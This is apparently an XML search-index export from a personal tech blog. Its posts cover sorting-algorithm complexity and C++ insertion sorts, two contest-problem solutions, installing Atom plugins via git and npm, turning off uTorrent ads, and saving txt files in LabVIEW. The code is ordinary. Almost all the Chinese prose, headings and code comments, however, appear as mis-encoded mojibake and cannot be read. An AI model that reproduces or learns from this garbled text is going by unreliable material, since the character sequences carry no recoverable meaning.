StartupNotify=true  
Categories=Development;IDE;Java;
</code></pre>
<p>å…¶ä¸­ExecæŒ‡å®šåº”ç”¨è·¯å¾„ï¼ŒIconæŒ‡å®šåº”ç”¨å›¾æ ‡ï¼ŒCategoriesç”¨äºåˆ†ç±»ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> linux </tag>
            
            <tag> atom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å¸¸ç”¨çš„æ’åºç®—æ³•]]></title>
      <url>https://www.litreily.top/2016/09/20/algor-sort/</url>
      <content type="html"><![CDATA[<h2 id="ç®—æ³•å¤æ‚åº¦åŠç¨³å®šæ€§"><a href="#ç®—æ³•å¤æ‚åº¦åŠç¨³å®šæ€§" class="headerlink" title="ç®—æ³•å¤æ‚åº¦åŠç¨³å®šæ€§"></a>ç®—æ³•å¤æ‚åº¦åŠç¨³å®šæ€§</h2><table>
<thead>
<tr>
<th style="text-align:center">æ’åºæ–¹æ³•</th>
<th style="text-align:center">æœ€å¥½æ—¶é—´</th>
<th style="text-align:center">å¹³å‡æ—¶é—´</th>
<th style="text-align:center">æœ€åæ—¶é—´</th>
<th style="text-align:center">è¾…åŠ©ç©ºé—´</th>
<th style="text-align:center">ç¨³å®šæ€§</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ç›´æ¥æ’å…¥</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">äºŒåˆ†æ’å…¥</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">å¸Œå°”</td>
<td style="text-align:center"></td>
<td style="text-align:center">O(n^1.25)</td>
<td style="text-align:center"></td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">ä¸ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">å†’æ³¡</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">å¿«é€Ÿ</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(lgn)</td>
<td style="text-align:center">ä¸ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">ç›´æ¥é€‰æ‹©</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(n^2)</td>
<td style="text-align:center">O(1)</td>
<td style="text-align:center">ä¸ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">å †</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center"></td>
<td style="text-align:center">ä¸ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">å½’å¹¶</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(nlgn)</td>
<td style="text-align:center">O(n)</td>
<td style="text-align:center">ç¨³å®š</td>
</tr>
<tr>
<td style="text-align:center">åŸºæ•°</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(d(rd+n))</td>
<td style="text-align:center">O(rd+n)</td>
<td style="text-align:center">ç¨³å®š</td>
</tr>
</tbody>
</table>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><h3 id="ç›´æ¥æ’å…¥"><a href="#ç›´æ¥æ’å…¥" class="headerlink" title="ç›´æ¥æ’å…¥"></a>ç›´æ¥æ’å…¥</h3><h4 id="ç®—æ³•æ­¥éª¤"><a href="#ç®—æ³•æ­¥éª¤" class="headerlink" title="ç®—æ³•æ­¥éª¤"></a>ç®—æ³•æ­¥éª¤</h4><ol>
<li>å°†åºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸º<strong>æœ‰åºåºåˆ—</strong>ï¼Œç¬¬äºŒä¸ªå…ƒç´ ç›´è‡³æœ€åä¸€ä¸ªå…ƒç´ ä½œä¸º<strong>å¾…æ’åºåºåˆ—</strong>;</li>
<li>ä»å‰å¾€åä¾æ¬¡æ‰«æ<strong>å¾…æ’åºåºåˆ—</strong>ï¼Œå°†æ‰«æçš„å…ƒç´ ä¾æ¬¡æ’å…¥åˆ°<strong>æœ‰åºåºåˆ—</strong>çš„é€‚å½“ä½ç½®ã€‚</li>
</ol>
<h4 id="åŸç†ç¤ºæ„"><a href="#åŸç†ç¤ºæ„" class="headerlink" title="åŸç†ç¤ºæ„"></a>åŸç†ç¤ºæ„</h4><p><img src="/assets/algorithm/insertSort.gif" alt="insertSort"></p>
<h4 id="ç¨‹åºå®ç°"><a href="#ç¨‹åºå®ç°" class="headerlink" title="ç¨‹åºå®ç°"></a>ç¨‹åºå®ç°</h4><pre><code class="C++">void insertsort(int array[], int length)
{
  if (array == NULL || length &lt;= 0)
    return;

  int index, temp;
  for (int i = 1; i&lt;length; i++)
  {
    // ä¿å­˜ array[i] è‡³ä¸­é—´å˜é‡
    temp = array[i];
    index = i;

    // å¯»æ‰¾æ’å…¥ä½ç½®, index = 1,2,...,i
    while (index&gt;0 &amp;&amp; temp&lt;array[index - 1])
    {
      array[index] = array[index - 1];
      index--;
    }

    // æ’å…¥æ•°æ®
    array[index] = temp;
  }
}

// ä½¿ç”¨å®ä¾‹
int main()
{
  int array[] = { 23,34,22,67,87,56,15,62,74,46 };
  int length = sizeof(array) / sizeof(int);
  insertsort(array, length);
  return 0;
}
</code></pre>
<h3 id="äºŒåˆ†æŸ¥æ‰¾æ’å…¥"><a href="#äºŒåˆ†æŸ¥æ‰¾æ’å…¥" class="headerlink" title="äºŒåˆ†æŸ¥æ‰¾æ’å…¥"></a>äºŒåˆ†æŸ¥æ‰¾æ’å…¥</h3><h4 id="äºŒåˆ†æ€æƒ³"><a href="#äºŒåˆ†æ€æƒ³" class="headerlink" title="äºŒåˆ†æ€æƒ³"></a>äºŒåˆ†æ€æƒ³</h4><p>äºŒåˆ†æŸ¥æ‰¾æ’å…¥æ˜¯åœ¨ç›´æ¥æ’å…¥çš„åŸºç¡€ä¸Šè¿›è¡Œä¼˜åŒ–ï¼Œç”±äºåœ¨æ’å…¥å‰éœ€è¦æŸ¥æ‰¾æ’å…¥ä½ç½®ï¼Œè€Œæ’å…¥ä½ç½®å¤„äº<strong>æœ‰åº</strong>åºåˆ—ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<strong>äºŒåˆ†æŸ¥æ‰¾</strong>æ›¿ä»£åŸå…ˆçš„é€ä¸ªæ‰«æï¼Œæé«˜æŸ¥æ‰¾æ•ˆç‡ã€‚</p>
<h4 id="äºŒåˆ†å®ç°"><a href="#äºŒåˆ†å®ç°" class="headerlink" title="äºŒåˆ†å®ç°"></a>äºŒåˆ†å®ç°</h4><pre><code class="C++">void binaryInsertsort(int array[], int length)
{
  if (array == NULL || length &lt;= 0)
    return;

  int index, temp, left, right, middle;
  for (int i = 1; i &lt; length; i++)
  {
    temp = array[i];      // å°†æœ¬æ¬¡å¾…æ’å…¥æ•°æ®å­˜å…¥temp
    left = 0;
    right = i - 1;

    if (array[i] &gt;= array[0])
    {
      // äºŒåˆ†æŸ¥æ‰¾
      while (left&lt;=right)
      {
        middle = (left + right) / 2;
        if (temp &lt; array[middle])
          right = middle - 1;
        else
          left = middle + 1;
      }
    }

    // ç§»åŠ¨æ•°æ®ï¼Œleftå³ä¸ºæŸ¥æ‰¾åˆ°çš„æ’å…¥ä½ç½®
    for (int j = i - 1; j &gt;= left; j--)
      array[j + 1] = array[j];

    array[left] = temp;      // æ’å…¥tempåˆ°æŒ‡å®šä½ç½®
  }
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> æ‚ç‰©æŸœ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¨¡æ‹Ÿè¯•é¢˜2 - äºŒè´§å°æ˜“çš„ç½‘æ ¼ç›’å­]]></title>
      <url>https://www.litreily.top/2016/09/12/WYMN2/</url>
      <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>äºŒè´§å°æ˜“æœ‰ä¸€ä¸ªW*Hçš„ç½‘æ ¼ç›’å­ï¼Œç½‘æ ¼çš„è¡Œç¼–å·ä¸º0~H-1ï¼Œç½‘æ ¼çš„åˆ—ç¼–å·ä¸º0~W-1ã€‚æ¯ä¸ªæ ¼å­è‡³å¤šå¯ä»¥æ”¾ä¸€å—è›‹ç³•ï¼Œä»»æ„ä¸¤å—è›‹ç³•çš„æ¬§å‡ é‡Œå¾—è·ç¦»ä¸èƒ½ç­‰äº2ã€‚</p>
<p>å¯¹äºä¸¤ä¸ªæ ¼å­åæ ‡(x1,y1), (x2,y2)çš„æ¬§å‡ é‡Œå¾—è·ç¦»ä¸ºï¼š((x1-x2)<em>(x1-x2)+(y1-y2)</em>(y1-y2))çš„ç®—æœ¯å¹³æ–¹æ ¹ã€‚</p>
<p>å°æ˜“æƒ³çŸ¥é“æœ€å¤šå¯ä»¥æ”¾å¤šå°‘å—è›‹ç³•åœ¨ç½‘æ ¼ç›’å­é‡Œã€‚</p>
<h3 id="è¾“å…¥æè¿°"><a href="#è¾“å…¥æè¿°" class="headerlink" title="è¾“å…¥æè¿°"></a>è¾“å…¥æè¿°</h3><blockquote>
<p>æ¯ç»„æ•°ç»„åŒ…å«ç½‘æ ¼é•¿å®½W,Hï¼Œç”¨ç©ºæ ¼åˆ†éš”ã€‚(1&lt;=Wã€H&lt;=1000)</p>
</blockquote>
<h3 id="è¾“å‡ºæè¿°"><a href="#è¾“å‡ºæè¿°" class="headerlink" title="è¾“å‡ºæè¿°"></a>è¾“å‡ºæè¿°</h3><blockquote>
<p>è¾“å‡ºä¸€ä¸ªæœ€å¤šå¯ä»¥æ”¾çš„è›‹ç³•æ•°</p>
</blockquote>
<h3 id="è¾“å…¥ä¾‹å­"><a href="#è¾“å…¥ä¾‹å­" class="headerlink" title="è¾“å…¥ä¾‹å­"></a>è¾“å…¥ä¾‹å­</h3><blockquote>
<p>3 2</p>
</blockquote>
<h3 id="è¾“å‡ºä¾‹å­"><a href="#è¾“å‡ºä¾‹å­" class="headerlink" title="è¾“å‡ºä¾‹å­"></a>è¾“å‡ºä¾‹å­</h3><blockquote>
<p>4</p>
</blockquote>
<h2 id="é¢˜ç›®è§£æ"><a href="#é¢˜ç›®è§£æ" class="headerlink" title="é¢˜ç›®è§£æ"></a>é¢˜ç›®è§£æ</h2><p>æ ¹æ®é¢˜æ„ï¼Œå¯ä»¥æ¨æµ‹å‡ºè›‹ç³•æ•°æœ€å¤šçš„æ”¾ç½®æ–¹æ¡ˆï¼šå°†ç½‘æ ¼è¿›è¡Œåˆ†åŒºï¼Œæ¯å››ä¸ªæ„æˆä¸€ä¸ªæ­£æ–¹å½¢çš„ç½‘æ ¼ä½œä¸ºä¸€ä¸ªåˆ†åŒºï¼Œç±»ä¼¼äºåæ ‡å˜æ¢ã€‚å‡è®¾åŸåæ ‡ä¸º(x,y),é‚£ä¹ˆå˜æ¢åçš„åˆ†åŒºåæ ‡ä¸º(x/2,y/2)ã€‚å½“å˜æ¢åçš„åˆ†åŒºåæ ‡æ»¡è¶³æ¨ªçºµåæ ‡ä¹‹å’Œä¸ºå¶æ•°æ—¶ï¼Œè¯¥åˆ†åŒºå†…çš„4ä¸ªç½‘æ ¼å‡å¯æ”¾ç½®è›‹ç³•ã€‚</p>
<p><img src="/assets/algorithm/putCake.png" alt="putCake"></p>
<h2 id="è§£é¢˜ç¨‹åº"><a href="#è§£é¢˜ç¨‹åº" class="headerlink" title="è§£é¢˜ç¨‹åº"></a>è§£é¢˜ç¨‹åº</h2><pre><code class="C++">#include &lt;iostream&gt;
using namespace std;

int main()
{

  int W,H;
  int cnt=0; // å®šä¹‰å¯æ”¾çš„è›‹ç³•æ•°
  cin&gt;&gt;W&gt;&gt;H; // è¾“å…¥ç›’å­ç½‘æ ¼çš„è¡Œåˆ—æ•°

  for(int i = 0; i&lt;H; i++)
      for(int j = 0; j &lt; W; j++)
        if((i/2 + j/2) % 2 == 0)
          cnt++;
  cout&lt;&lt;cnt&lt;&lt;endl;
  return 0;
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> æ‚ç‰©æŸœ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¨¡æ‹Ÿè¯•é¢˜1 - è®¡ç®—PA+PB]]></title>
      <url>https://www.litreily.top/2016/09/12/WYMN1/</url>
      <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>æ­£æ•´æ•°Açš„<strong>DA(1ä½æ•´æ•°)éƒ¨åˆ†</strong>å®šä¹‰ä¸ºç”±Aä¸­æ‰€æœ‰ç»„æˆçš„æ–°æ•´æ•°PAã€‚ä¾‹å¦‚ï¼šç»™å®šA=3862767ï¼ŒDA=6ï¼Œåˆ™Açš„<strong>6éƒ¨åˆ†</strong>PAæ˜¯66ï¼Œå› ä¸ºAä¸­æœ‰2ä¸ª6ã€‚</p>
<p>ç°ç»™å®šA, DA, B, DB, è¯·ç¼–å†™ç¨‹åºè®¡ç®—PA+PBã€‚</p>
<h3 id="è¾“å…¥æè¿°"><a href="#è¾“å…¥æè¿°" class="headerlink" title="è¾“å…¥æè¿°"></a>è¾“å…¥æè¿°</h3><blockquote>
<p>è¾“å…¥åœ¨ä¸€è¡Œä¸­ä¾æ¬¡ç»™å‡ºAï¼ŒDAï¼ŒB,DBï¼Œä¸­é—´ä»¥ç©ºæ ¼åˆ†éš”ï¼Œå…¶ä¸­ 0 &lt; A, B &lt; 1e10</p>
</blockquote>
<h3 id="è¾“å‡ºæè¿°"><a href="#è¾“å‡ºæè¿°" class="headerlink" title="è¾“å‡ºæè¿°"></a>è¾“å‡ºæè¿°</h3><blockquote>
<p>åœ¨ä¸€è¡Œä¸­è¾“å‡ºPA+PBçš„å€¼</p>
</blockquote>
<h3 id="è¾“å…¥ä¾‹å­"><a href="#è¾“å…¥ä¾‹å­" class="headerlink" title="è¾“å…¥ä¾‹å­"></a>è¾“å…¥ä¾‹å­</h3><blockquote>
<p>3862767 6 13530293 3</p>
</blockquote>
<h3 id="è¾“å‡ºä¾‹å­"><a href="#è¾“å‡ºä¾‹å­" class="headerlink" title="è¾“å‡ºä¾‹å­"></a>è¾“å‡ºä¾‹å­</h3><blockquote>
<p>399</p>
</blockquote>
<h2 id="è§£é¢˜ç¨‹åº"><a href="#è§£é¢˜ç¨‹åº" class="headerlink" title="è§£é¢˜ç¨‹åº"></a>è§£é¢˜ç¨‹åº</h2><pre><code class="C++">#include &lt;iostream&gt;
using namespace std;

void getPA(unsigned long num, int DA, unsigned long &amp; PA)
{
    PA = 0;
    while(num)           // å¾ªç¯æŸ¥æ‰¾numä¸­DAçš„ä¸ªæ•°
    {
      if(num%10==DA)
        PA = PA*10+DA;
      num/=10;
    }
}

int main()
{
    unsigned long A,B;
    unsigned long PA=0,PB=0;
    int DA,DB;

    cin&gt;&gt;A&gt;&gt;DA&gt;&gt;B&gt;&gt;DB;
    getPA(A,DA,PA);      // è®¡ç®—PA
    getPA(B,DB,PB);      // è®¡ç®—PB
    cout&lt;&lt;PA+PB&lt;&lt;endl;
    return 0;
}
</code></pre>
]]></content>
      
        <categories>
            
            <category> æ‚ç‰©æŸœ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è§£å†³atomæ— æ³•å®‰è£…æ’ä»¶çš„é—®é¢˜]]></title>
      <url>https://www.litreily.top/2016/08/21/atom-packages/</url>
      <content type="html"><![CDATA[<h2 id="å‡ºé”™ä¿¡æ¯"><a href="#å‡ºé”™ä¿¡æ¯" class="headerlink" title="å‡ºé”™ä¿¡æ¯"></a>å‡ºé”™ä¿¡æ¯</h2><p>å€˜è‹¥ä½¿ç”¨<a href="https://atom.io/" target="_blank" rel="noopener">atom</a>è‡ªå¸¦çš„æ’ä»¶å®‰è£…å·¥å…·&quot;File-&gt;Settings-&gt;Install&quot;å®‰è£…æ’ä»¶ï¼Œé€šå¸¸ä¼šæŠ¥é”™ï¼Œä»¥&quot;pp-markdown&quot;ä¸ºä¾‹ï¼Œå…¶é”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">  gyp info it worked if it ends with ok
  gyp info using node-gyp@2.0.2
  gyp info using node@0.10.40 | win32 | ia32
  gyp http GET http://gh-contractor-zcbenz.s3.amazonaws.com/atom-shell/dist/v0.37.8/node-v0.37.8.tar.gz
  gyp WARN install got an error, rolling back install
  gyp

  ! Compiler tools not found
  Packages that depend on modules that contain C/C++ code will fail to install.
  Read &lt;a href=&quot;http://flight-manual.atom.io/&quot;&gt;here&lt;/a&gt; for instructions on installing Python and Visual Studio.
  Run apm install --check after installing to test compiling a native module.
</code></pre>
<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="å®‰è£…node-js"><a href="#å®‰è£…node-js" class="headerlink" title="å®‰è£…node.js"></a>å®‰è£…node.js</h3><p>å®‰è£…<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a>çš„ç›®çš„åœ¨äºä½¿ç”¨npmå·¥å…·ï¼Œæ”¾å¼ƒapmå·¥å…·ã€‚å¦‚æœå·²ç»å®‰è£…å¥½ï¼Œé‚£ä¹ˆè¿™ä¸€æ­¥è‡ªç„¶å¯ä»¥ç•¥è¿‡ã€‚</p>
<h3 id="ä¸‹è½½æ’ä»¶"><a href="#ä¸‹è½½æ’ä»¶" class="headerlink" title="ä¸‹è½½æ’ä»¶"></a>ä¸‹è½½æ’ä»¶</h3><p>åœ¨atomçš„æ’ä»¶å®‰è£…ç•Œé¢æœç´¢æ‰€éœ€çš„æ’ä»¶ï¼Œç‚¹å‡»æ’ä»¶åç§°å°†ä¼šä»ç½‘é¡µæ‰“å¼€atomçš„æ’ä»¶åº“ã€‚</p>
<p><img src="/assets/atom/package.png" alt="atompackage"></p>
<p>æ­¤æ—¶æˆ‘ä»¬ç‚¹å‡»<code>Repo</code>å¯ä»¥è½¬è‡³å…¶githubé¡µé¢ï¼Œå¤åˆ¶æ’ä»¶çš„è¿œç¨‹ä»“åº“ç›®å½•ã€‚</p>
<p><img src="/assets/atom/package_git.png" alt="gitpackage"></p>
<p>åœ¨æœ¬åœ°æ‰“å¼€æ–‡ä»¶å¤¹&quot;C:\Users\USER_NAME\.atom\packages&quot;ï¼Œä½¿ç”¨gitæŒ‡ä»¤å°†æ’ä»¶<code>clone</code>åˆ°è¯¥ç›®å½•ã€‚</p>
<pre><code class="bash">git clone æ’ä»¶çš„è¿œç¨‹ä»“åº“ç›®å½•
</code></pre>
<h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>è½¬è‡³æ’ä»¶ç›®å½•ï¼Œä½¿ç”¨<code>npm install</code>å®Œæˆæ’ä»¶å®‰è£…ï¼Œé‡å¯atomå³å¯ã€‚</p>
<pre><code class="bash">$ cd pp-markdown
$ npm install
marked@0.3.6 node_modules\marked

atom-space-pen-views@2.2.0 node_modules\atom-space-pen-views
â”œâ”€â”€ fuzzaldrin@2.1.0
â””â”€â”€ space-pen@5.1.2 (underscore-plus@1.6.6, jquery@2.1.4, grim@1.5.0)
</code></pre>
<h3 id="æ•ˆæœé¢„è§ˆ"><a href="#æ•ˆæœé¢„è§ˆ" class="headerlink" title="æ•ˆæœé¢„è§ˆ"></a>æ•ˆæœé¢„è§ˆ</h3><p><img src="/assets/atom/pp-markdown.png" alt="pp-markdown"></p>
<p>è¯¥æ–¹æ¡ˆçœ‹ä¼¼æœ‰ç‚¹ç¹çï¼Œå´ä¹Ÿèƒ½å¤Ÿè¾¾åˆ°ç›®çš„ï¼Œæ¯•ç«Ÿæˆ‘ä»¬éœ€è¦å®‰è£…çš„æ’ä»¶å¹¶ä¸ä¼šå¤ªå¤šï¼Œå®ƒæ—¥æœ‰æ›´å¥½çš„æ–¹æ³•å†ç”¨ä¸è¿Ÿã€‚</p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> atom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¶ˆé™¤utorrentä¸­çš„å¹¿å‘Š]]></title>
      <url>https://www.litreily.top/2016/08/17/clearAD/</url>
      <content type="html"><![CDATA[<p>å…¶å®ï¼Œç½‘ä¸Šå·²æœ‰å¤§æŠŠçš„æ•™ç¨‹æ•™æˆ‘å¦‚ä½•å»å¹¿å‘Šï¼Œä½†æ¯æ¬¡éƒ½è¦è°·æ­Œç™¾åº¦å´ä¹Ÿçƒ¦ä¸èƒœçƒ¦ï¼Œè¿™ä¹Ÿå°±åªå¥½æ¬è¿åˆ°è¿™å’¯ï¼Œä¸€åŠ³æ°¸é€¸ã€‚</p>
<h2 id="å»å¹¿å‘Šå‰"><a href="#å»å¹¿å‘Šå‰" class="headerlink" title="å»å¹¿å‘Šå‰"></a>å»å¹¿å‘Šå‰</h2><p><img src="/assets/utorrent/haveAD.png" alt="haveAD"></p>
<h2 id="å»å¹¿å‘Š"><a href="#å»å¹¿å‘Š" class="headerlink" title="å»å¹¿å‘Š"></a>å»å¹¿å‘Š</h2><ol>
<li>åœ¨utorrentçš„èœå•æ ä¸­é€‰æ‹©&quot;é€‰é¡¹&quot;ï¼Œæ‰“å¼€â€œè®¾ç½®â€ç•Œé¢ï¼Œæˆ–è€…æŒ‰å¿«æ·é”®<code>ctrl+p</code>;</li>
<li>åœ¨è®¾ç½®ç•Œé¢ä¸­é€‰æ‹©æœ€åä¸€é¡¹&quot;é«˜çº§&quot;;</li>
<li>åœ¨è¿‡æ»¤ä¸­è¾“å…¥&quot;offers.&quot;ï¼Œå°†ä»¥ä¸‹ä¸¤é¡¹è®¾ä¸ºfalseï¼š<ul>
<li>&quot;offers.sponsored_torrent_offer_enabled&quot; ,</li>
<li>&quot;offers.left_rail_offer_enabled&quot;</li>
</ul>
</li>
<li>åœ¨è¿‡æ»¤ä¸­è¾“å…¥&quot;gui.&quot;,å°†&quot;gui.show_notorrents_node&quot;è®¾ä¸ºfalse.</li>
</ol>
<p><img src="/assets/utorrent/settingPanel.png" alt="haveAD"></p>
<h2 id="å»å¹¿å‘Šå"><a href="#å»å¹¿å‘Šå" class="headerlink" title="å»å¹¿å‘Šå"></a>å»å¹¿å‘Šå</h2><p><img src="/assets/utorrent/noAD.png" alt="haveAD"></p>
<p>å¥½äº†ï¼Œè‡³æ­¤å¹¿å‘Šä¸€æ‰«å…¨æ— ï¼Œenjoy itï¼</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tools </tag>
            
            <tag> utorrent </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - å­˜å‚¨txtæ–‡ä»¶]]></title>
      <url>https://www.litreily.top/2016/06/10/labview-rwTxt/</url>
      <content type="html"><![CDATA[<h2 id="å­˜å‚¨æ–‡ä»¶"><a href="#å­˜å‚¨æ–‡ä»¶" class="headerlink" title="å­˜å‚¨æ–‡ä»¶"></a>å­˜å‚¨æ–‡ä»¶</h2><h3 id="ç®€å•å­˜å‚¨"><a href="#ç®€å•å­˜å‚¨" class="headerlink" title="ç®€å•å­˜å‚¨"></a>ç®€å•å­˜å‚¨</h3><p>å†™ä¸ªç®€å•çš„å°ç¨‹åºï¼Œç”¨äºå­˜å‚¨å››åˆ—éšæœºæ•°ï¼Œæ¯éš”1så­˜å‚¨ä¸€æ¬¡ï¼Œæ•°æ®ä¹‹é—´ä»¥tabä½œä¸ºåˆ†éš”ç¬¦ã€‚</p>
<p><img src="/assets/labview/rwTxt/readTxt.png" alt="readTxt"></p>
<p>å­˜å‚¨åçš„æ–‡ä»¶:</p>
<p><img src="/assets/labview/rwTxt/testTxt.png" alt="testTxt"></p>
<h3 id="åŠ å…¥è¡¨å¤´"><a href="#åŠ å…¥è¡¨å¤´" class="headerlink" title="åŠ å…¥è¡¨å¤´"></a>åŠ å…¥è¡¨å¤´</h3><p>çœ‹ç€ä¸Šé¢è¿™ä¸ªæ–‡ä»¶ï¼Œæ€»æ„Ÿè§‰å°‘ç‚¹ä»€ä¹ˆï¼Œå¯¹äº†ï¼Œè¡¨å¤´è¿˜æ²¡åŠ ã€‚é‚£å°±åŠ ä¸ªåˆ¤æ–­ï¼Œé¦–æ¬¡åˆ›å»ºæ–‡ä»¶æ—¶æ·»ä¸ªè¡¨å¤´ã€‚ä¸ºäº†ç®€åŒ–ç‚¹ï¼Œå®šæ—¶ç»“æ„å°±ä¸æˆªå›¾äº†ã€‚</p>
<p><img src="/assets/labview/rwTxt/addTitle.png" alt="addTitle"></p>
<p>ç°åœ¨å†æ¥çœ‹çœ‹è¿™ä¸ªtxtæ–‡ä»¶ï¼Œè¡¨å¤´å·²ç»è¢«åŠ ä¸Šäº†ï¼Œè™½ç„¶çœ‹ç€æ²¡æ€ä¹ˆå¯¹é½ï¼Œä½†è¿™æ˜¯æ­£å¸¸çš„ï¼Œå¦‚æœå¯¼å…¥è‡³Excelå°±å¯ä»¥çœ‹å‡ºæ¥ã€‚</p>
<p><img src="/assets/labview/rwTxt/testTitle.png" alt="testTitle"></p>
<h3 id="å­˜å‚¨æ—¶é—´"><a href="#å­˜å‚¨æ—¶é—´" class="headerlink" title="å­˜å‚¨æ—¶é—´"></a>å­˜å‚¨æ—¶é—´</h3><p>å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨å­˜å‚¨æ•°æ®çš„åŒæ—¶éœ€è¦è®°å½•å­˜å‚¨æ—¶é—´ï¼Œé‚£ä¹ˆå°±å†ç¨ç¨ä¿®æ”¹ä¸€ä¸‹ç¨‹åºã€‚</p>
<p><img src="/assets/labview/rwTxt/addTime.png" alt="addTime"></p>
<p>æ·»åŠ çš„ä¸œè¥¿ä¹Ÿä¸å¤šï¼Œå°±æ˜¯å¤šäº†ä¸ªè¡¨å¤´ï¼Œæ¯ç»„æ•°æ®å‰å¤šäº†ä¸ªæ—¶é—´æ ‡è¯†ï¼Œéœ€è¦è¯´æ˜ä¸€ç‚¹çš„æ˜¯ï¼Œè¿™é‡Œç”¨åˆ°çš„&quot;æ ¼å¼åŒ–æ—¥æœŸ/æ—¶é—´å­—ç¬¦ä¸²&quot;ï¼Œå®ƒçš„æ ¼å¼åŒ–æ–¹æ³•å¯ä»¥å‚è€ƒä»¥ä¸‹è¯´æ˜ã€‚</p>
<p><img src="/assets/labview/rwTxt/timeStrHelp.png" alt="timeStrHelp"></p>
<blockquote>
<p>ä¸‹åˆ—ä»£ç ä¸ºéƒ¨åˆ†å¸¸ç”¨çš„æ—¶é—´æ ¼å¼ä»£ç ï¼š%cå¯æ˜¾ç¤ºä¾æ®åœ°åŸŸè¯­è¨€è®¾å®šçš„æ—¥æœŸ/æ—¶é—´ã€‚<br><strong>æ—¶é—´</strong>ç›¸å…³æ ¼å¼ä»£ç ä¸ºï¼š%Xï¼ˆæŒ‡å®šåœ°åŸŸçš„æ—¶é—´ï¼‰ï¼Œ%Hï¼ˆå°æ—¶ï¼Œ24å°æ—¶ï¼‰ï¼Œ%Iï¼ˆå°æ—¶ï¼Œ12å°æ—¶ï¼‰ï¼Œ%Mï¼ˆåˆ†é’Ÿï¼‰ï¼Œ%Sï¼ˆç§’ï¼‰ï¼Œ%uï¼ˆåˆ†æ•°ç§’ï¼‰ï¼Œ%pï¼ˆa.m./p.m.æ ‡è¯†ï¼‰ã€‚<br><strong>æ—¥æœŸ</strong>ç›¸å…³æ ¼å¼ä»£ç ä¸ºï¼š%xï¼ˆæŒ‡å®šåœ°åŸŸæ—¥æœŸï¼‰ï¼Œ%yï¼ˆä¸¤ä½å¹´ä»½ï¼‰ï¼Œ%Yï¼ˆå››ä½å¹´ä»½ï¼‰ï¼Œ%mï¼ˆæœˆä»½ï¼‰ï¼Œ%bï¼ˆæœˆåç¼©å†™ï¼‰ï¼Œ%dï¼ˆä¸€ä¸ªæœˆä¸­çš„å¤©å€¼ï¼‰ï¼Œ%aï¼ˆæ˜ŸæœŸåç¼©å†™ï¼‰ã€‚</p>
</blockquote>
